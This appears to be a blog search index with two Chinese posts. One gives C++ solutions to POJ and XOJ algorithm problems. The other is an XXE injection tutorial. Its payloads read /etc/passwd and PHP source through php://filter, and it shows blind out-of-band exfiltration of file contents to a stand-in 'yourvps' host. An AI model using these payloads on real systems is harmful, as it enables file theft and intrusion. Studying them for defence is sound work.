<?xml version="1.0" encoding="utf-8"?>
<search>
  
    
    <entry>
      <title><![CDATA[ACM-OJ[长期更新]]]></title>
      <url>%2F3017%2F06%2F19%2FACM-OJ-%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%2F</url>
      <content type="text"><![CDATA[最近更新日期：2017-06-21干脆把自己平日做的题放在一篇文章里吧。不然太分散了。POJ: 1163 1258 1273 1979 2387 2388 3069 3176 3253 3617XOJ: 1004 1005 1022 1061 1062 1075 1078 1316 POJ1163题目http://poj.org/problem?id=1163 思路见下面POJ-3176题分析 提交123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;iostream&gt;#include &lt;memory&gt;#include &lt;cstdio&gt;#include &lt;cstdlib&gt;#define MAX 355int way[MAX][MAX] = &#123;0&#125;;int triangle[MAX][MAX] = &#123;0&#125;;int n;using namespace std;int main()&#123; scanf("%d",&amp;n); for (int i = 0; i &lt; n; i++) for (int j = 0; j &lt;= i; j++) scanf("%d",&amp;triangle[i][j]); way[0][0] = triangle[0][0]; for (int i = 1; i &lt; n; i++) for (int j = 0; j &lt;= i; j++) &#123; if ( j == 0 ) &#123; way[i][j] = way[i-1][j] + triangle[i][j]; &#125; else if ( j == i ) &#123; way[i][j] = way[i-1][j-1] + triangle[i][j]; &#125; else &#123; way[i][j] = max(way[i-1][j],way[i-1][j-1]) + triangle[i][j]; &#125; &#125; int lastrow = n - 1; int res = way[lastrow][0]; for (int j = 1; j &lt; n; j++)&#123; if (way[lastrow][j] &gt; res ) res = way[lastrow][j]; &#125; printf("%d\n", res); return 0;&#125; 1258题目http://poj.org/problem?id=1258 思路最小生成树。 提交1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include &lt;iostream&gt;#include &lt;cstdio&gt;#include &lt;cstdlib&gt;#include &lt;algorithm&gt;#define MAX 105#define INF 0xFFFFFFusing namespace std;int n;int cost[MAX][MAX] ;int mincost[MAX];bool used[MAX];int prim() &#123; for ( int i = 0; i &lt; n; i++)&#123; mincost[i] = INF; used[i] = false; &#125; mincost[0] = 0; int res = 0; while ( true )&#123; int v = -1; for ( int u = 0; u &lt; n; u++)&#123; if ( !used[u] &amp;&amp; ( v == -1 || mincost[u] &lt; mincost[v])) v = u; &#125; if ( v == -1 ) break; used[v] = true; res += mincost[v]; for (int u = 0; u &lt; n; u++) mincost[u] = min(mincost[u], cost[v][u]); &#125; return res;&#125;int main()&#123; while(scanf("%d",&amp;n) != EOF )&#123; for (int i = 0; i &lt; n; i++) for (int j = 0; j &lt; n; j++) cost[i][j] = INF; for (int i = 0; i &lt; n; i++) for (int j = 0; j &lt; n ; j++) scanf("%d", &amp;cost[i][j]); printf("%d\n",prim()); &#125; return 0;&#125; 1273题目http://poj.org/problem?id=1273 思路模板题目，直接求最大流就可以。我用了vector来构造邻接表，而这题的输入时一次包含了很多个测试例子。所以每次读完后都需要对邻接表进行初始化，即进行下面的操作：12for (int i = 1; i &lt;= m; i++ ) G[i].clear(); 方法是网上找的，网上说这样清空了元素，但不会回收内存。 提交1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#include &lt;iostream&gt;#include &lt;cstdio&gt;#include &lt;cstdlib&gt;#include &lt;vector&gt;#include &lt;algorithm&gt;#include &lt;memory.h&gt;#define MAX 205#define INF 0x7fffffffusing namespace std;struct edge &#123;int to ,cap, rev;&#125;;vector&lt;edge&gt; G[MAX];bool used[MAX];int n,m;void add_edge(int from, int to,int cap)&#123; edge one,two; one.to = to; one.cap = cap; one.rev = (int)(G[to].size()); G[from].push_back(one); two.to = from; two.cap = 0; two.rev = (int)(G[from].size()-1); G[to].push_back(two);&#125;int dfs(int v, int t, int f)&#123; if ( v == t) return f; used[v] = true; for ( int i = 0; i &lt; (int)G[v].size(); i++)&#123; edge &amp;e = G[v][i]; if ( !used[e.to] &amp;&amp; e.cap &gt; 0)&#123; int d = dfs(e.to,t, f &gt; e.cap?e.cap:f); if ( d &gt; 0) &#123; e.cap -= d; G[e.to][e.rev].cap += d; return d; &#125; &#125; &#125; return 0;&#125;int max_flow(int s, int t)&#123; int flow = 0; for (;;)&#123; memset(used, 0, sizeof(used)); int f = dfs(s,t,INF); if (f == 0) return flow; flow += f; &#125;&#125;int main()&#123; while (scanf("%d%d",&amp;n,&amp;m) != EOF)&#123; for (int i = 1; i &lt;= m; i++ ) G[i].clear(); for (int i = 0; i &lt; n; i++)&#123; int s, t,c; scanf("%d%d%d",&amp;s,&amp;t,&amp;c); add_edge(s,t,c); &#125; printf("%d\n",max_flow(1,m)); &#125; return 0;&#125; 1979题目http://poj.org/problem?id=1979 思路DFS() 提交1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;iostream&gt;#include &lt;cstdio&gt;#include &lt;cstdlib&gt;#define X 20#define Y 20using namespace std;int x,y;int nx,ny;int sx,sy;int num;char maze[X][Y];int dx[4] = &#123;-1,0,1,0&#125;;int dy[4] = &#123;0,1,0,-1&#125;;void dfs(int r, int s)&#123; num += 1; maze[r][s] = '#'; for (int i = 0; i &lt; 4; i++)&#123; int t1 = r+dx[i]; int t2 = s+dy[i]; if (0 &lt;= t1 &amp;&amp; t1 &lt; x &amp;&amp; 0 &lt;= t2 &amp;&amp; t2 &lt; y &amp;&amp; maze[t1][t2] == '.')&#123; dfs(t1,t2); &#125; &#125;&#125;int main()&#123; scanf("%d%d",&amp;y,&amp;x); while( x != 0 &amp;&amp; y != 0)&#123; num = 0; for (int i = 0; i &lt; x; i++)&#123; for (int j = 0; j &lt; y; j++)&#123; scanf("\n%c",&amp;maze[i][j]); if (maze[i][j] == '@')&#123; sx = i; sy = j; &#125; &#125; &#125; dfs(sx,sy); printf("%d\n",num); scanf("%d%d",&amp;y,&amp;x); &#125; return 0;&#125; 2387题目http://poj.org/problem?id=2387 思路最短路径 + 队列优先 。这题竟然是先读入边数再读入顶点数，Ｏrz另外会有 重边， 不过如果用邻接表实现的话，可以不用管，如果邻接矩阵来实现的话，最后矩阵中存储的是从点到点的多条边的最小值。 提交1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#include &lt;iostream&gt;#include &lt;stdio.h&gt;#include &lt;memory.h&gt;#include &lt;queue&gt;#include &lt;vector&gt;#include &lt;algorithm&gt;#define MAX_V 200000#define INF 0xFFFFFFusing namespace std;struct edge &#123; int to, cost, flag ;&#125;;typedef pair&lt;int, int&gt; P;int V;int E;vector&lt;edge&gt; G[MAX_V];int d[MAX_V];void dijkstra(int s);int main()&#123; scanf("%d%d", &amp;E,&amp;V); for (int i = 0; i &lt; E; i++)&#123; int s, t, cost; edge temp1,temp2; scanf("%d%d%d", &amp;s, &amp;t, &amp;cost); temp1.to = t; temp1.cost = cost; G[s].push_back(temp1); temp2.to = s; temp2.cost = cost; G[t].push_back(temp2); &#125; dijkstra(1); printf("%d",d[V]); return 0;&#125;void dijkstra(int s)&#123; priority_queue&lt;P, vector&lt;P&gt;, greater&lt;P&gt; &gt; que; fill(d+1,d + V+1, INF); d[s] = 0; que.push(P(0,s)); while ( !que.empty())&#123; P p = que.top(); que.pop(); int v = p.second; if ( d[v] &lt; p.first) continue; for (int i = 0; i &lt; G[v].size(); i++)&#123; edge e = G[v][i]; if ( d[e.to] &gt; d[v] + e.cost) &#123; d[e.to] = d[v] + e.cost; que.push(P(d[e.to], e.to)); &#125; &#125; &#125;&#125; 2388题目http://poj.org/problem?id=2388 思路先排序，之后打印出中间值。水题。 提交stl1234567891011121314151617181920#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;cstdio&gt;#include &lt;cstdlib&gt;#define MAX 100005using namespace std;int n;int arr[MAX];int main()&#123; scanf("%d",&amp;n); for (int i = 0; i &lt; n; i++)&#123; scanf("%d",&amp;arr[i]); &#125; sort(arr,arr+n); printf("%d",arr[n/2]); return 0;&#125; 快排12345678910111213141516171819202122232425262728293031323334#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;cstdio&gt;#include &lt;cstdlib&gt;#define MAX 100005using namespace std;int n;int arr[MAX];void quick_sort(int l,int h)&#123; if(h&lt;l+2)return ; int e=h,p=l; while(l&lt;h) &#123; while(++l&lt;e &amp;&amp; arr[l]&lt;=arr[p]); while(--h&gt;p &amp;&amp; arr[h]&gt;=arr[p]); if(l&lt;h) swap(arr[l],arr[h]); &#125; swap(arr[h],arr[p]); quick_sort(p,h); quick_sort(l,e);&#125;int main()&#123; scanf("%d",&amp;n); for (int i = 0; i &lt; n; i++)&#123; scanf("%d",&amp;arr[i]); &#125; quick_sort(0,n); printf("%d",arr[n/2]); return 0;&#125; 3069题目http://poj.org/problem?id=3069 思路贪心算法。在 while( i &lt; n ) 循环中，第一个while循环，找到距离当前点（未覆盖）大于r的第一个点，该点的前一个（i—）做上标记。第二个while循环，从已经标记的点出发，找到距离当前点（已经覆盖）大于r的第一个点，并将其作为下一次大循环的起点。 提交123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;iostream&gt;#include &lt;cstdio&gt;#include &lt;cstdlib&gt;#include &lt;algorithm&gt;#define N 1005using namespace std;int n;int r;int loc[N];int marknum;int main()&#123; scanf("%d%d",&amp;r,&amp;n); while ( n != -1 &amp;&amp; r != -1)&#123; for (int i = 0; i &lt; n; i++) scanf("%d",&amp;loc[i]); sort(loc,loc+n); marknum = 0; int i = 0; int j = 0; while ( i &lt; n )&#123; while ( i &lt; n &amp;&amp; loc[j] + r &gt;= loc[i] ) i++; i--; marknum++; j = i; while ( i &lt; n &amp;&amp; loc[j] + r &gt;= loc[i]) i++; j = i; &#125; printf("%d\n",marknum); scanf("%d%d",&amp;r,&amp;n); &#125; return 0;&#125; 3176题目http://poj.org/problem?id=3176 思路二维数组triangle用于保存三角形，二维数组way用于保存路径。以题目数据为例：1234573 88 1 02 7 4 44 5 2 6 5 分为三种情况： 最左边，只能从上一行的同列来，way[i][j] = way[i-1][j] + triangle[i][j] 最右边，只能从上一行的斜对角线来，way[i-1][j-1] + triangle[i][j]; 中间，可以从上一行的左边或者右边来，way[i][j] = max(way[i-1][j],way[i-1][j-1]) + triangle[i][j]; 填表完成后，对最后一行way[n-1][]找出最大值即为答案。 提交123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;iostream&gt;#include &lt;memory&gt;#include &lt;cstdio&gt;#include &lt;cstdlib&gt;#define MAX 355int way[MAX][MAX] = &#123;0&#125;;int triangle[MAX][MAX] = &#123;0&#125;;int n;using namespace std;int main()&#123; scanf("%d",&amp;n); for (int i = 0; i &lt; n; i++) for (int j = 0; j &lt;= i; j++) scanf("%d",&amp;triangle[i][j]); way[0][0] = triangle[0][0]; for (int i = 1; i &lt; n; i++) for (int j = 0; j &lt;= i; j++) &#123; if ( j == 0 ) &#123; way[i][j] = way[i-1][j] + triangle[i][j]; &#125; else if ( j == i ) &#123; way[i][j] = way[i-1][j-1] + triangle[i][j]; &#125; else &#123; way[i][j] = max(way[i-1][j],way[i-1][j-1]) + triangle[i][j]; &#125; &#125; int lastrow = n - 1; int res = way[lastrow][0]; for (int j = 1; j &lt; n; j++)&#123; if (way[lastrow][j] &gt; res ) res = way[lastrow][j]; &#125; printf("%d\n", res); return 0;&#125; 3253题目http://poj.org/problem?id=3253 思路霍夫曼树的变形。重点在于对两个最小值相加后对数组的处理。 提交1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#include &lt;iostream&gt;#include &lt;cstdio&gt;#include &lt;cstdlib&gt;#include &lt;algorithm&gt;using namespace std;int n;int k;int len[20005];int total;void solve()&#123; long long ans = 0; while ( n &gt; 1 )&#123; int mii1 = 0; int mii2 = 1; if (len[mii1] &gt; len[mii2]) swap(mii1,mii2); for (int i = 2; i &lt; n; i++)&#123; if (len[i] &lt; len[mii1])&#123; mii2 = mii1; mii1 = i; &#125; else if (len[i] &lt; len[mii2])&#123; mii2 = i; &#125; &#125; int t = len[mii1] + len[mii2]; ans += t; if (mii1 == n-1) swap(mii1,mii2); len[mii1] = t; len[mii2] = len[n-1]; n--; &#125; printf("%lld\n",ans);&#125;int main()&#123; total = 0; k = 0; scanf("%d",&amp;n); for (int i = 0; i &lt; n; i++)&#123; scanf("%d",&amp;len[i]); &#125; solve(); return 0;&#125; 3617题目http://poj.org/problem?id=3617 思路贪心算法，每次选择排序靠前的字母加到字符串t中。如果两个排序相同，则看它们的下一个字母的顺序，可以使用一个递归函数来判断。 提交123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#include &lt;iostream&gt;#include &lt;cstdio&gt;#include &lt;cstdlib&gt;using namespace std;int n;char s[2005];char t[2005];int sp,ep;int compare(int i,int j)&#123; if (s[i] &gt; s[j])&#123; return 1; &#125; else if (s[i] &lt; s[j])&#123; return 0; &#125; else if (s[i] == s[j])&#123; i++; j--; return compare(i,j); &#125;&#125;int main()&#123; scanf("%d",&amp;n); for (int i = 0; i &lt; n; i++)&#123; scanf(" %c",&amp;s[i]); &#125; sp = 0; ep = n-1; int lenoft = 0; while (lenoft != n)&#123; int p = compare(sp,ep); if (p == 0)&#123; t[lenoft] = s[sp]; sp++; lenoft++; &#125; else if (p == 1)&#123; t[lenoft] = s[ep]; ep--; lenoft++; &#125; &#125; for (int i = 1; i &lt;= n; i++)&#123; printf("%c",t[i-1]); if (i % 80 == 0) printf("\n"); &#125; printf("\n"); return 0;&#125; XOJ1004想法冒泡等可能会超时。堆排序和快排的复杂度都是 O(nlogn)。课上为了节约时间所以：） 提交12345678910111213141516171819#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;stdio.h&gt;using namespace std;int arrays[1000004];int main()&#123; int n; scanf("%d",&amp;n); int i,j; for(i = 0;i &lt; n;i++) scanf("%d",&amp;arrays[i]); sort(arrays,arrays+n); for(j = 0;j &lt; n - 1;j++) printf("%d ",arrays[j]); printf("%d",arrays[n - 1]); return 0;&#125; oj对格式要求好严格… 1005此题另写一篇文章了。 1022想法直接用普通的矩阵乘法就过了，时间复杂度 O(n^3) 提交123456789101112131415161718192021222324252627282930313233343536373839#include &lt;iostream&gt;#include &lt;stdio.h&gt;int main()&#123; int n1,m1; int n2,m2; int matrix1[100][100]; int matrix2[100][100]; scanf("%d%d",&amp;n1,&amp;m1); int i,j; for(i = 0;i &lt; n1;i++) for(j = 0;j &lt; m1;j++) scanf("%d",&amp;matrix1[i][j]); scanf("%d%d",&amp;n2,&amp;m2); for(i = 0;i &lt; n2;i++) for(j = 0;j &lt; m2;j++) scanf("%d",&amp;matrix2[i][j]); int matrix3[100][100]; for(i = 0;i &lt; n1;i++) for(j = 0;j &lt; m2;j++) matrix3[i][j]=0; int i1,j2; for(i1 = 0;i1 &lt; n1;i1++) for(j2 = 0;j2 &lt; m2;j2++) for(j = 0;j &lt; n2;j++) matrix3[i1][j2] += matrix1[i1][j] * matrix2[j][j2]; for(i = 0;i &lt; n1;i++) &#123; for(j = 0;j &lt; m2 - 1;j++) printf("%d ",matrix3[i][j]); printf("%d\n",matrix3[i][m2-1]); &#125; return 0;&#125; 1061想法贪心算法。其实就是任务选择问题。 按照约会完成时间从早到晚排序 选择具有最早完成时间的girl 将此girl加入到约会列表中 对子问题重复上述问题 强烈谴责Ckp 提交12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485#include &lt;iostream&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;using namespace std;typedef struct info&#123; char name[16]; char starttime[6]; char endtime[6];&#125;info;void quick_sort(info * s, int l, int r,int n);int main()&#123; int n; static info mm[1005] ; static info mmcopy[1005]; scanf("%d",&amp;n); int i,j; for (i = 1; i &lt;= n; i++)&#123; scanf("%s%s%s",mm[i].name,mm[i].starttime,mm[i].endtime); &#125; quick_sort(mm,1,n,n); strcpy(mmcopy[1].endtime,mm[1].endtime); strcpy(mmcopy[1].name,mm[1].name); strcpy(mmcopy[1].starttime,mm[1].starttime); int cal = 1; for (i = 2; i &lt;= n; i++)&#123; if (strcmp(mmcopy[cal].endtime,mm[i].starttime) &lt;= 0)&#123; cal++; strcpy(mmcopy[cal].endtime,mm[i].endtime); strcpy(mmcopy[cal].name,mm[i].name); strcpy(mmcopy[cal].starttime,mm[i].starttime); &#125; &#125; printf("%d\n",cal); for ( i = 1; i &lt; cal; i++)&#123; printf("%s ",mmcopy[i].name); &#125; printf("%s",mmcopy[i].name); return 0;&#125;void quick_sort(info* s, int l, int r,int n)&#123; if (l &lt; r)&#123; int i = l, j = r; int temp; info x; strcpy(x.endtime,s[l].endtime); strcpy(x.name,s[l].name); strcpy(x.starttime,s[l].starttime); while (i &lt; j) &#123; while(i &lt; j &amp;&amp; strcmp(s[j].endtime,x.endtime) &gt;= 0) j--; if(i &lt; j)&#123; strcpy(s[i].endtime,s[j].endtime); strcpy(s[i].starttime,s[j].starttime); strcpy(s[i].name , s[j].name); i++; &#125; while(i &lt; j &amp;&amp; strcmp(s[i].endtime,x.endtime) &lt; 0) i++; if(i &lt; j)&#123; strcpy(s[j].endtime,s[i].endtime); strcpy(s[j].starttime,s[i].starttime); strcpy(s[j].name,s[i].name); j--; &#125; &#125; strcpy(s[i].endtime,x.endtime); strcpy(s[i].starttime,x.starttime); strcpy(s[i].name,x.name); quick_sort(s, l, i - 1,n); quick_sort(s, i + 1, r,n); &#125;&#125; 1062想法贪心算法。背包问题。尽量选择面值大的。将元转换为角，这样都是整数，进行处理更方便。 提交1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;iostream&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;using namespace std;typedef struct zhibi&#123; int number; int value;&#125;zhibi;int main()&#123; int stat = 0; int n; scanf("%d",&amp;n); zhibi arr[7]; int i; for (i = 1; i &lt; 7; i++)&#123; scanf("%d",&amp;arr[i].number); &#125; arr[1].value = 500; arr[2].value = 100; arr[3].value = 50; arr[4].value = 10; arr[5].value = 5; arr[6].value = 1; int remainMoney; remainMoney = 1000 - n * 25; for (i = 1; i &lt; 7; i++)&#123; if (remainMoney == 0)&#123; break; &#125; else &#123; int j = remainMoney / arr[i].value; int number = j&gt;arr[i].number?arr[i].number:j; remainMoney = remainMoney - number*arr[i].value; stat = stat + number; &#125; &#125; if (remainMoney == 0)&#123; printf("%d",stat); &#125; else &#123; printf("-1\n"); &#125; return 0;&#125; 1075思路直接dijkstra。 采用邻接矩阵存储。 提交1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;memory.h&gt;#include &lt;stdbool.h&gt;#define MAXN 100#define INF 0xfffffint cost[MAXN+2][MAXN+2]; // 保存 图 （各权值）int n; // 顶点数int d[MAXN]; // 从初始点出发 的最短距离bool used[MAXN]; // 已经使用过的图void dijkstra(int s);int min(int a,int b);int main()&#123; int i, j; scanf("%d", &amp;n); for (i = 1; i &lt;= n; i++) for (j = 1; j &lt;= n; j++) scanf("%d", &amp;cost[i][j]); dijkstra(1);&#125;void dijkstra(int s)&#123; int i,j; for (i = 1; i &lt;= n; i++) d[i] = INF; memset(used, false, sizeof(bool) * (n+1)); d[s] = 0; while (true)&#123; int v = -1; int u; for (u = 1; u &lt;= n; u++) if ( !used[u] &amp;&amp; ( v == -1 || d[u] &lt; d[v])) v = u; if (v == -1) break; used[v] = true; for (u = 1; u &lt;= n; u++) d[u] = min( d[u], d[v] + cost[v][u]); &#125; printf("%d",d[n]);&#125;int min(int a,int b)&#123; return a&gt;b?b:a;&#125; 1078思路任意两点间的最短路径问题的变体吧。一旦找出了从某个源点（人）到其他所有人需要的层数时，记录下来，如果有的人与其他所有人都不认识，则该层数是 无穷大（INF）。之后通过循环，找出从每个源点出发所需要的层数，并取最大值。要注意的是 算法求得最短路径 是 经过了几条路径（路径权为 1 ，路径权和即有几条路径），而题目的 层数M 是指 两个人之间还有多少人，即经过了多少个 点， 所以在最后的结果中记得减一。 提交dijkstra算法1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;memory.h&gt;#include &lt;stdbool.h&gt;#define MAXN 100#define INF 0xfffffint cost[MAXN+2][MAXN+2]; // 保存 图 （各权值）int n; // 顶点数int d[MAXN]; // 从初始点出发 的最短距离bool used[MAXN]; // 已经使用过的图void dijkstra(int s);int min(int a,int b);int main()&#123; int i, j; scanf("%d", &amp;n); for (i = 1; i &lt;= n; i++) for (j = 1; j &lt;= n; j++) scanf("%d", &amp;cost[i][j]); dijkstra(1);&#125;void dijkstra(int s)&#123; int i,j; for (i = 1; i &lt;= n; i++) d[i] = INF; memset(used, false, sizeof(bool) * (n+1)); d[s] = 0; while (true)&#123; int v = -1; int u; for (u = 1; u &lt;= n; u++) if ( !used[u] &amp;&amp; ( v == -1 || d[u] &lt; d[v])) v = u; if (v == -1) break; used[v] = true; for (u = 1; u &lt;= n; u++) d[u] = min( d[u], d[v] + cost[v][u]); &#125; printf("%d",d[n]);&#125;int min(int a,int b)&#123; return a&gt;b?b:a;&#125; Floyd-Warshall 算法1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define MAX 102#define INF 0xfffffint G[MAX][MAX];int n;void warshall_floyd();int min(int a, int b);int max(int a, int b);int main()&#123; int i, j; int M = 0; scanf("%d", &amp;n); for (i = 1; i &lt;= n; i++) for (j = 1; j &lt;= n; j++)&#123; scanf("%d", &amp;G[i][j]); if ( G[i][j] == 0) G[i][j] = INF; if ( i == j ) G[i][j] = 0; &#125; warshall_floyd(); for (i = 1; i &lt;= n; i++) for (j = 1; j &lt;= n; j++) M = max(M, G[i][j]); if ( M == INF) printf("%d",-1); else printf("%d\n", M-1); return 0;&#125;void warshall_floyd()&#123; int k, i, j; for (k = 1; k &lt;= n; k++) for (i = 1; i &lt;= n; i++) for (j = 1; j &lt;= n; j++) G[i][j] = min(G[i][j], G[i][k] + G[k][j]);&#125;int min(int a, int b)&#123; return a &gt; b ? b : a;&#125;int max(int a, int b)&#123; return a &gt; b ? a : b;&#125; 1316想法贪心算法。背包问题。有别于0/1背包问题。每次选取尽量多的单位价值高的物体。 提交12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;using namespace std;typedef struct unit&#123; double unitValue; int id; double weight; double value;&#125;unit;void quick_sort(unit s[], int l, int r);int main()&#123; double m,n; static unit valuesor[100010]; scanf("%lf%lf",&amp;m,&amp;n); int i; for (i = 1; i &lt;= n; i++)&#123; scanf("%lf%lf",&amp;valuesor[i].weight,&amp;valuesor[i].value); valuesor[i].unitValue = (double)valuesor[i].value / (double)valuesor[i].weight; valuesor[i].id = i; &#125; quick_sort(valuesor,1,n); double remainSpace = m; double allValue = 0; i = 1; for (i = 1; i &lt;= n ; i++)&#123; if (remainSpace &lt;= 0) break; if (valuesor[i].weight &lt;= remainSpace)&#123; remainSpace = remainSpace - valuesor[i].weight; allValue += valuesor[i].value; &#125;else&#123; allValue += remainSpace *valuesor[i].unitValue; remainSpace = 0; &#125; &#125; printf("%lf\n",allValue); return 0;&#125;void quick_sort(unit s[], int l, int r)&#123; if (l &lt; r) &#123; int i = l, j = r; unit x = s[l]; while (i &lt; j) &#123; while(i &lt; j &amp;&amp; s[j].unitValue &lt;= x.unitValue) j--; if(i &lt; j)&#123; s[i].unitValue = s[j].unitValue; s[i].id = s[j].id; s[i].value = s[j].value; s[i].weight = s[j].weight; i++; &#125; while(i &lt; j &amp;&amp; s[i].unitValue &gt;= x.unitValue) i++; if(i &lt; j)&#123; s[j].unitValue = s[i].unitValue; s[j].id = s[i].id; s[j].value = s[i].value; s[j].weight = s[i].weight; j--; &#125; &#125; s[i].id = x.id; s[i].unitValue = x.unitValue; s[i].value = x.value; s[i].weight = x.weight; quick_sort(s, l, i - 1); quick_sort(s, i + 1, r); &#125;&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[小试XML实体注入攻击]]></title>
      <url>%2F2017%2F07%2F04%2F%E5%B0%8F%E8%AF%95XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%2F</url>
      <content type="text"><![CDATA[XML实体注入攻击 基础知识XML（Extensible Markup Language）被设计用来传输和存储数据。关于它的语法，本文不准备写太多，只简单介绍一下。 XML基本知识12345&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;note&gt;&lt;to&gt;chybeta&lt;/to&gt;&lt;from&gt;ph0en1x&lt;/from&gt;&lt;/note&gt; 在上面代码中的第一行，定义XML的版本与编码。 在XML文档中，所有的元素都必须正确的嵌套，形成树形结构。并且整个XML文档中必须要有一个根元素。如上代码，&lt;note&gt;是整个文档的根元素。嵌套在note标签中的&lt;to&gt;和&lt;from&gt;则是根的子元素。 同时，所有的XML元素都必须有关闭标签，这点不像html语法那样松散。如果缺失关闭标签，则会导致XML解析失败。 实体所有的XML文档都由五种简单的构建模块（元素，属性，实体，PCDATA CDATA）构成。这里着重介绍一下实体：实体是用于定义引用普通文本或特殊字符的快捷方式的变量，实体引用是对实体的引用。实体可在内部或外部进行声明。因此我们利用引入实体，构造恶意内容，从而达到攻击的目的。 实体类型XML实体分为四种：字符实体，命名实体，外部实体，参数实体。 文档类型定义：DTDwikipedia关于这的描述是:The XML DTD syntax is one of several XML schema languages。简单的说，DTD的作用是定义XML文档的合法构建模块。如前所述，实体也是构建模块之一。因此可以利用DTD来内部或外部引入实体。 其基本格式：1&lt;!DOCTYPE 根元素名 [ 元素描述 ]&gt; 内部引入格式：1&lt;!ENTITY 实体名称 "实体的值"&gt; 将DTD和XML放在同一份文档中，利用DTD定义的实体即为内部实体。1234567&lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;!DOCTYPE xxe [ &lt;!ENTITY chybeta "Hello World!"&gt; ]&gt; &lt;xxe&gt; &amp;chybeta;&lt;/xxe&gt; 访问该XML文档，&amp;chybeta;会被解析为Hello World!并输出。 外部引入基本格式：1&lt;!ENTITY 实体名称 SYSTEM "URI"&gt; 通过引用定义在外部的DTD中的实体，我们称之为外部实体。由于xxe漏洞主要利用的是外部实体，所以这里暂不展开。具体实例见下。 利用方式xxe注入以php环境为例，index.php内容如下：1234&lt;?php $xml=simplexml_load_string($_GET['xml']); print_r((string)$xml);?&gt; 读取本地文件 利用各种协议可以读取文件。比如file协议，这里的测试环境为win，所以这里我选择读取c盘里的TEST.txt。123&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY file SYSTEM "file:///c://TEST.txt"&gt;]&gt;&lt;root&gt;&amp;file;&lt;/root&gt; 将上述xml进行url编码后传进去，可以发现读取了TEST.txt中的内容。 我这里测试时，如果不进行url编码则不能成功解析。 若使用fill协议，在unix环境下，可以用如下xml来读取passwd：123&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY file SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;root&gt;&amp;file;&lt;/root&gt; 如果要读取php文件，因为php、html等文件中有各种括号&lt;，&gt;，若直接用file读取会导致解析错误，此时可以利用php://filter将内容转换为base64后再读取。 123&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt;]&gt;&lt;root&gt;&amp;file;&lt;/root&gt; 这里同样先经过url编码后再传入。读取结果如下: 命令执行php环境下，xml命令执行要求php装有expect扩展。而该扩展默认没有安装。这里暂不进行测试。 内网探测/SSRF由于xml实体注入攻击可以利用http://协议，也就是可以发起http请求。可以利用该请求去探查内网，进行SSRF攻击。 bind xxe以php环境为例，现在更改index.php内容如下：123&lt;?php $xml=simplexml_load_string($_GET['xml']);?&gt; 少了print_r，即没有回显消息。这个时候我们可以利用参数实体，通过发起http请求来攻击。 读取本地文件payload11234567&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE data [&lt;!ENTITY % file SYSTEM "file:///c://TEST.txt"&gt;&lt;!ENTITY % dtd SYSTEM "http://yourvps/xxe.xml"&gt;%dtd; %all;]&gt;&lt;value&gt;&amp;send;&lt;/value&gt; 在我的vps的xxe.xml的内容如下：1&lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'http://yourvps/%file;'&gt;"&gt; 而测试文件TEST.txt内容为：1chybeta 整个的调用过程如下：解析时%dtd引入xxe.xml，之后%all引入send的定义，最后引用了实体send，把%file文件内容通过一个http请求发了出去。注意需要把payload经过url编码。查看vps上的access.log： 若要读取php等文件，同样需要先经过base64加密下。1234567&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE data [&lt;!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt;&lt;!ENTITY % dtd SYSTEM "http://yourvps/xxe.xml"&gt;%dtd; %all;]&gt;&lt;value&gt;&amp;send;&lt;/value&gt; 查看access.log: payload2发送的xml：123456&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE data [&lt;!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=index.php"&gt;&lt;!ENTITY % dtd SYSTEM "http://yourvps/xxe.xml"&gt;%dtd; %send;]&gt; 而在vps上的xxe.xml内容为：1&lt;!ENTITY % payload2 "&lt;!ENTITY &amp;#x25; send SYSTEM 'http://yourvps/%file;'&gt;"&gt; %payload2; 注意的是，&amp;#25; 不能直接写成%，否则无法解析。 